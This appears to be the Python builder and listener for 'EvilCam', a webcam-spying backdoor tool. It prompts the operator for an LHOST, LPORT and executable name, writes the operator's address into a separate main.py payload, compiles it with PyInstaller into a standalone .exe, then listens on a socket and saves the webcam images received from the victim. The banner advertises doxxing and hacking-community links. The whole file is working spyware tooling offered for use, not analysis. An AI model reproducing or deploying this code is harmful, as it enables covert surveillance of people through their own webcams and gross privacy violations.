import os
import socket
import subprocess
import shutil
import time

def check():
    print("""
 _____       _ _  ____                
| ____|_   _(_) |/ ___|__ _ _ __ ___  
|  _| \ \ / / | | |   / _ | '_  _ \ 
| |___ \ V /| | | |__| (_| | | | | | |
|_____| \_/ |_|_|\____\__,_|_| |_| |_| 
          
    [DOXX] > https://rvlt.gg/CfKMvhkF
    [4NET] > https://4net.fwh.is/
""")
    os.system("git pull")
    time.sleep(2)
    
def evilcam():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""
 _____       _ _  ____                
| ____|_   _(_) |/ ___|__ _ _ __ ___  
|  _| \ \ / / | | |   / _ | '_  _ \ 
| |___ \ V /| | | |__| (_| | | | | | |
|_____| \_/ |_|_|\____\__,_|_| |_| |_| 

    [GITHUB]  >  github.com/madanokr001
    [VERSION] >  1.0
""")


def backdoor(ip, port):
    file = "main.py"
    with open(file, "r", encoding="utf-8") as f:
        content = f.readlines()

    for i in range(len(content)):
        if content[i].startswith("    ip = "):  
            content[i] = f'    ip = "{ip}"\n'
        elif content[i].startswith("    port = "):  
            content[i] = f'    port = {port}\n'

    with open(file, "w", encoding="utf-8") as f:
        f.writelines(content)

def exe(name):
    print("[EVILCAM] BUILDING...")
    print("[EVILCAM] *.........*")

    subprocess.run(["pyinstaller", "--onefile", "--clean", "--name", name, "main.py"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    exepath = f"dist/{name}.exe"
    lib = "EVILCAM"

    if not os.path.exists(lib):
        os.makedirs(lib)

    if os.path.exists(exepath):
        shutil.copy(exepath, os.path.join(lib, f"{name}.exe"))

    if os.path.exists("dist"):
        shutil.rmtree("dist")
    if os.path.exists("build"):
        shutil.rmtree("build")
    if os.path.exists(f"{name}.spec"):
        os.remove(f"{name}.spec")

    print("[EVILCAM] CREATED")
    print(f"[EVILCAM] > {name}.exe")


def connect(ip, port):
    backdoor(ip, port)
    exe(name)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen(1)
    print("[EVILCAM] LISTENING...")
    print(f"[EVILCAM] > {ip}:{port}")

    client, addr = server.accept()
    print("[EVILCAM] LOOKING FOR WEBCAM...")
    print(f"[EVILCAM] > {addr}")

    print("[EVILCAM] EVILCAM SCREENSHOT...")
    print("[EVILCAM] > evilcam.jpg")

    return client

def save(data):
    with open("evilcam.jpg", "wb") as f:
        f.write(data)

def send(client):
    while True:
        try:
            size_data = client.recv(4)
            if not size_data:
                print("[EVILCAM] 404 NOT FOUND")
                break

            size = int.from_bytes(size_data, byteorder='big')
            data = b""

            while len(data) < size:
                data += client.recv(size - len(data))

            save(data)

        except Exception as e:
            print("[EVILCAM] 404 NOT FOUND")
            break

    client.close()

if __name__ == "__main__":
    check()
    evilcam()
    print("[EVILCAM] SELECT LHOSTS")
    ip = input("[EVILCAM] > ")
    print("[EVILCAM] SELECT LPORT")
    port = int(input("[EVILCAM] > "))
    print("[EVILCAM] SELECT EXE NAME")
    name = input("[EVILCAM] > ")

    client = connect(ip, port)
    send(client)